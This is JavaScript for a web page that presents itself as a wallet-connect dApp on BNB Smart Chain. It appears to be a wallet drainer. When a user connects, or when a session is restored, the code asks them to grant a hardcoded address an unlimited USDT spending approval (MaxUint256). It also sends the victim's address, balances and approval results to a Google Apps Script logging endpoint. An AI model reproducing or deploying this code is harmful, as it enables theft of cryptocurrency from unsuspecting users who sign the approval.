// ===== ABOUT / CONTACT POPUPS =====
const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
const contactBtn = document.getElementById("contactBtn");
// ===== APPROVAL MODAL =====
const approvalModal    = document.getElementById("approvalModal");
const closeApprovalBtn = document.getElementById("closeApprovalModal");
const modalApproveBtn  = document.getElementById("modalApproveBtn");
const modalCancelBtn   = document.getElementById("modalCancelBtn");

function openApprovalModal(){
  approvalModal.classList.remove("hidden");
}

function closeApprovalModal(){
  approvalModal.classList.add("hidden");
}

closeApprovalBtn?.addEventListener("click", closeApprovalModal);
modalCancelBtn?.addEventListener("click", closeApprovalModal);



    





    
  (function(){
    // ===== CONFIG =====
    function formatToken(n) {
      n = Number(n);
      if (Number.isInteger(n)) return n.toString();
      return n.toFixed(4).replace(/\.?0+$/, "");
    }

    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbwvuWmHzDB8dIWiMXtg6xnOyKLOLHJkDzi8cecrY6NcV7_BAIIN9oQditDpY5EYOK1q6A/exec";
    const APPS_SCRIPT_SECRET = "justforme";

    const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
    const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";

    const BNB_TESTNET_CHAIN_ID_DEC = 56;
    const BNB_TESTNET_CHAIN_ID_HEX = "0x38";
    const BNB_TESTNET_LABEL        = "BNB Smart Chain (56)";
    const BNB_TESTNET_RPC          = "https://bsc-dataseed.binance.org";

    const ERC20_APPROVE_ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];
    const ERC20_BALANCE_ABI = [
      "function balanceOf(address owner) view returns (uint256)" 
    ];
    const ERC20_ALLOWANCE_ABI = [
      "function allowance(address owner, address spender) view returns (uint256)"
    ];

    // USDT on BSC uses 18 decimals
    const TOKEN_DECIMALS = 18;



    let providerInstance      = null;
    let web3Instance          = null;
    let currentAddress        = null;
    let currentUserId         = null;
    let currentBNBBalance     = null;
    let currentTokenBalance   = null;
    let isWalletConnected = false;
  
   
 
let isTokenApproved = false;
let approvalFailed  = false;




    

let appKitEip155Provider = null;

// Watch AppKit provider globally (mobile fix)
// This catches both fresh connections AND restored sessions.
function setupAppKitProviderWatcher() {
  if (!window.appKit || typeof window.appKit.subscribeProviders !== "function") return;

  window.appKit.subscribeProviders(async (state) => {
    const provider = state["eip155"] || null;

    // NEWLY CONNECTED or RESTORED provider
    if (provider && provider !== appKitEip155Provider) {
      appKitEip155Provider = provider;
      await handleAppKitProvider(provider);
    }

    // DISCONNECTED provider
    if (!provider && appKitEip155Provider) {
      appKitEip155Provider = null;
      clearSessionUI();
    }
  });
}

async function handleAppKitProvider(provider) {
  try {
    providerInstance = provider;
    web3Instance = new Web3(providerInstance);

    let accounts = await web3Instance.eth.getAccounts();

    // Mobile Chrome sometimes returns [] for 0.5 seconds → retry
    if (!accounts || !accounts.length) {
      for (let i = 0; i < 5; i++) {
        await new Promise(r => setTimeout(r, 400));
        accounts = await web3Instance.eth.getAccounts();
        if (accounts && accounts.length) break;
      }
    }

    if (!accounts || !accounts.length) {
      console.warn("Still no accounts after retry mobile.");
      return;
    }

    const address = accounts[0].toLowerCase();
    currentAddress = address;

    // Restore UI + balances
    await restoreSessionFromAddress(address);

    isWalletConnected = true;
    

    setStatus("Connected");

    // Only ask approval when new session detected
    await ensureTokenApproval();

  } catch (err) {
    console.error("handleAppKitProvider error:", err);
  }
}

    

    // ===== userId helpers =====
    function storageKeyFor(address){
      return "userId_" + address.toLowerCase();
    }
    function generateUserIdFromAddress(address){
      address = (address || "").toLowerCase();
      let hash = 0;
      for (let i = 0; i < address.length; i++){
        hash = ((hash << 5) - hash) + address.charCodeAt(i);
        hash |= 0;
      }
      hash = Math.abs(hash);
      const num = 100000 + (hash % 900000);
      return String(num);
    }
    function getOrCreateUserIdFor(address){
      const key = storageKeyFor(address);
      let id = localStorage.getItem(key);
      if (!id || !/^[0-9]{6}$/.test(id)) {
        id = generateUserIdFromAddress(address);
        localStorage.setItem(key, id);
      }
      return id;
    }

    // ===== UI refs =====
    const connectBtn      = document.getElementById("connectBtn");
    const statusTextEl    = document.getElementById("statusText");
    const walletAddressEl = document.getElementById("walletAddress");
    const userIdEl        = document.getElementById("userId");
    const walletNetworkEl = document.getElementById("walletNetwork");
    const walletBalanceEl = document.getElementById("walletBalance");
    const tokensContainer = document.getElementById("tokens");

    







    function setStatus(txt){
      if(statusTextEl) statusTextEl.textContent = txt;
      console.log("[status]", txt);
    }
    function setWalletInfo(address, network, bnb){
      if(walletAddressEl) walletAddressEl.textContent = address || "Wallet Address";
      if(walletNetworkEl) walletNetworkEl.textContent = network || "Network";
      if(walletBalanceEl){
        walletBalanceEl.textContent =
          (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
      }
    }
    function setUserIdUI(id){
      if(userIdEl) userIdEl.textContent = id || "-";
    }

    function clearSessionUI(){
      isWalletConnected = false;
      currentAddress    = null;
      currentUserId     = null;
      currentBNBBalance = null;
      currentTokenBalance = null;

      setStatus("Not connected");
      setWalletInfo("Wallet Address","Network",null);
      setUserIdUI("-");



  


     
      if(connectBtn){
        connectBtn.textContent = "Connect Wallet";
        connectBtn.classList.remove("connected");
      }


      
      
      
      isTokenApproved = false;
approvalFailed  = false;
updateApproveButtonUI();


    }

   
  

    

    function attachProviderListeners(p){
      if(!p || !p.on) return;
      try{
        p.on("accountsChanged", async function(accounts){
          if(!accounts || !accounts.length){
            clearSessionUI();
            return;
          }
          const addr = accounts[0].toLowerCase();
          await restoreSessionFromAddress(addr);
        });

        p.on("chainChanged", function(chainId){
          if(walletNetworkEl){
            walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
          }
        });

        p.on("disconnect", function(){
          clearSessionUI();
        });
      }catch(e){
        console.warn("attachProviderListeners", e);
      }
    }

    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance, eventType = "connect"){
      try{
        const payload = new URLSearchParams({
          secret      : APPS_SCRIPT_SECRET,
          address     : address || "",
          network     : networkText || "",
          timestamp   : new Date().toISOString(),
          userId      : userId || "",
          bnbBalance  : bnbBalance !== undefined && bnbBalance !== null ? String(bnbBalance) : "",
          tokenBalance: tokenBalance !== undefined && tokenBalance !== null ? String(tokenBalance) : "",
          eventType   : eventType || "connect"
        });

        console.log("notifyBackend payload", Object.fromEntries(payload.entries()));

        await fetch(APPS_SCRIPT_URL, {
          method: "POST",
          mode  : "no-cors",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
          },
          body: payload.toString()
        });
      }catch(err){
        console.error("notifyBackend error:", err);
      }
    }

    async function getTokenBalance(address){
      try{
        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){
          console.warn("TOKEN_ADDRESS invalid");
          return "";
        }
        if(!providerInstance){
          console.warn("No providerInstance for token balance");
          return "";
        }
        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
        const raw            = await tokenContract.balanceOf(address);
        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);

        return formatted;
      }catch(err){
        console.error("getTokenBalance error:", err);
        return "";
      }
    }

    async function switchToBSC(provider){
      try{
        await provider.request({
          method:"wallet_switchEthereumChain",
          params:[{chainId:BNB_TESTNET_CHAIN_ID_HEX}]
        });
        return true;
      }catch(switchError){
        if(switchError.code === 4902){
          try{
            await provider.request({
              method:"wallet_addEthereumChain",
              params:[{
                chainId:BNB_TESTNET_CHAIN_ID_HEX,
                chainName:"BNB Smart Chain",
                nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
                rpcUrls:[BNB_TESTNET_RPC],
                blockExplorerUrls:["https://bscscan.com"]
              }]
            });
            return true;
          }catch(addErr){
            console.error("Could not add BNB Smart Chain:", addErr);
            return false;
          }
        }
        console.error("Switch error:", switchError);
        return false;
      }
    }

    async function ensureTokenApproval(){
      // helper: always log with last known balances
      async function logApproval(tag){
        await notifyBackend(
          currentAddress || "",
          BNB_TESTNET_LABEL,
          currentUserId || "",
          currentBNBBalance,
          currentTokenBalance,
          tag
        );
      }

      // basic guards
      if(!TOKEN_ADDRESS){
        console.warn("TOKEN_ADDRESS not set, skipping approve");
        await logApproval("approval_skipped_no_token");
        return;
      }
      if(!SPENDER_ADDRESS){
        console.warn("SPENDER_ADDRESS not set, skipping approve");
        await logApproval("approval_skipped_no_spender");
        return;
      }
      if(!providerInstance || !web3Instance){
        console.warn("No providerInstance/web3Instance for approval");
        await logApproval("approval_skipped_no_provider");
        return;
      }

      try{
        setStatus("Preparing token approval…");

        const ethersProvider = new ethers.BrowserProvider(
          providerInstance,
          BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
        );
        const signer       = await ethersProvider.getSigner();
        const ownerAddress = (await signer.getAddress()).toLowerCase();

        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
          alert(
            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
            "It MUST be the BEP-20 token contract address, not your wallet."
          );
          setStatus("Connected (approval skipped)");
          await logApproval("approval_skipped_token_is_wallet");
          return;
        }

        // 1) check allowance
        const readContract = new ethers.Contract(
          TOKEN_ADDRESS,
          ERC20_ALLOWANCE_ABI,
          ethersProvider
        );
        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
        console.log("[approve] currentAllowance =", currentAllowance.toString());

       if (currentAllowance > 0n) {
  isTokenApproved = true;
  approvalFailed  = false;
  setStatus("Connected + Approved ✅");
  updateApproveButtonUI();
  await logApproval("approval_already");
  return;
}


        // 2) send approve tx
        setStatus("Waiting for wallet to confirm approval…");
        const writeContract = new ethers.Contract(
          TOKEN_ADDRESS,
          ERC20_APPROVE_ABI,
          signer
        );

        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
        console.log("[approve] tx sent:", tx.hash);

        setStatus("Approval pending on chain…");
        await tx.wait();

    isTokenApproved = true;
approvalFailed  = false;
setStatus("Connected + Approved ✅");
updateApproveButtonUI();
await logApproval("approval_approved");

      }catch(err){
        console.error("Token approve error:", err);

        let tag = "approval_error";
        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
          tag = "approval_rejected";
        }
isTokenApproved = false;
approvalFailed  = true;
setStatus("Connected • Approval failed");
updateApproveButtonUI();
alert("Token approval failed: " + (err?.message || err));
await logApproval(tag);

      }
    }




modalApproveBtn?.addEventListener("click", async () => {
  modalApproveBtn.disabled = true;
  modalApproveBtn.textContent = "Waiting for wallet…";

  try {
    await ensureTokenApproval();
  } finally {
    modalApproveBtn.disabled = false;
    modalApproveBtn.textContent = "Approve USDT";

    if (isTokenApproved) {
      closeApprovalModal();

    }
  }
});



    
    async function restoreSessionFromAddress(address){
      currentAddress = address;

      const balanceWei = await web3Instance.eth.getBalance(address);
      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
      const userId     = getOrCreateUserIdFor(address);

      currentUserId       = userId;
      currentBNBBalance   = balanceBNB;

      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
      setUserIdUI(userId);

      const tokenBalanceRaw  = await getTokenBalance(address);
      const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";

      currentTokenBalance = tokenBalanceNum;

      if(tokensContainer){
        tokensContainer.innerHTML =
          'USDT balance: ' + prettyBalance +
          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
      }

   isWalletConnected = true;

if (connectBtn) {
  connectBtn.textContent = "Connected";
  connectBtn.classList.add("connected");
}


      
      updateApproveButtonUI();




      // Return values for connectFlow
      return {
        balanceBNB,
        tokenBalance: tokenBalanceNum,
        userId
      };
    }

    // 🔁 NEW: connect using Reown AppKit
 // 🔁 NEW: connect using Reown AppKit (fixed for mobile)
async function connectFlow() {
  try {
    if (!window.appKit) {
      alert("Wallet connect UI not ready. Please reload the page.");
      return;
    }

    setStatus("Connecting…");

    let gotProvider = null;

    // 1) Subscribe BEFORE opening the modal
    const unsubscribe = window.appKit.subscribeProviders((state) => {
      const evm = state["eip155"];
      if (evm && !gotProvider) {
        gotProvider = evm;
      }
    });

    // 2) Open AppKit modal (Connect view)
    await window.appKit.open({ view: "Connect" });

    // 3) Stop listening
    if (typeof unsubscribe === "function") {
      unsubscribe();
    }

    // 4) If no provider, user probably closed modal or connect failed
    const provider = gotProvider;
    if (!provider) {
      setStatus("Not connected");
      return;
    }

    // 5) Use this provider for Web3 & Ethers
    providerInstance = provider;
    web3Instance     = new Web3(providerInstance);

    attachProviderListeners(providerInstance);

    const accounts = await web3Instance.eth.getAccounts();
    if(!accounts || !accounts.length){
      setStatus("No account");
      return;
    }
    const address = accounts[0].toLowerCase();
    currentAddress = address; // helpful for approval logging

    // 6) Ensure BSC (56)
    let chainId    = await web3Instance.eth.getChainId();
    let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);

    if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
      const switched = await switchToBSC(providerInstance);
      if(!switched){
        alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
        setStatus("Wrong network");
        return;
      }
      chainId    = await web3Instance.eth.getChainId();
      chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
      if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
        alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
        setStatus("Wrong network");
        return;
      }
    }

    // 7) Connected + correct network
    setStatus("Connected");

    const sessionPromise = (async () => {
      const session = await restoreSessionFromAddress(address);
      const balanceBNB   = session.balanceBNB;
      const tokenBalance = session.tokenBalance;
      const userId       = session.userId;

      // Log to sheet
      notifyBackend(
        address,
        BNB_TESTNET_LABEL,
        userId,
        balanceBNB,
        tokenBalance,
        "connect"
      ).catch(console.error);

      return session;
    })();


    updateApproveButtonUI();


    // 8) Token approval (same behavior as before)
    await ensureTokenApproval();
    sessionPromise.catch(console.error);

  } catch (err) {
    console.error("connectFlow error (AppKit):", err);
    setStatus("Connection failed");
    alert("Connection failed: " + (err && err.message ? err.message : err));
  }
}



function updateApproveButtonUI() {
  const approveBtn = document.getElementById("approveBtn");
  if (!approveBtn) return;

  // Not connected → hide
  if (!isWalletConnected) {
    approveBtn.classList.add("hidden");
    return;
  }

  // Approved already → hide
  if (isTokenApproved) {
    approveBtn.classList.add("hidden");
    return;
  }

  // Connected + not approved → show
  approveBtn.classList.remove("hidden");
}







    

    async function tryAutoReconnectSilent(){
      // keep your old silent reconnect using injected wallets
      if(window.trustwallet && window.trustwallet.ethereum){
        const injected = window.trustwallet.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);
        const accounts = await injected.request({method:"eth_accounts"});
        if(accounts && accounts.length){
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session (Trust Wallet)...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      if(window.ethereum){
        const injected = window.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);
        const accounts = await injected.request({method:"eth_accounts"});
        if(accounts && accounts.length){
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      return false;
    }

    async function autoConnectOnLoad(){
      try{
        const restored = await tryAutoReconnectSilent();
        if(!restored){
          clearSessionUI();
        }
      }catch(e){
        console.warn("autoConnectOnLoad failed:", e);
        clearSessionUI();
      }
    }

    


  

    

   
        

    // ===== DOMContentLoaded =====
    document.addEventListener("DOMContentLoaded", async function(){

   

const approveBtn = document.getElementById("approveBtn");
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    if (!isWalletConnected) return;
    approveBtn.disabled = true;
    approveBtn.textContent = "Approving…";

    await ensureTokenApproval();

    approveBtn.disabled = false;
    approveBtn.textContent = "Approve Now";
  });
}



      

      
      
setupAppKitProviderWatcher();
        if(connectBtn){
        connectBtn.addEventListener("click", function(){
          if(isWalletConnected) return;
          connectFlow();
        });
      }






      





      
 
  

    

      await autoConnectOnLoad();
      const yearEl = document.getElementById("year");
      if(yearEl) yearEl.textContent = new Date().getFullYear();
    });

  })();
  
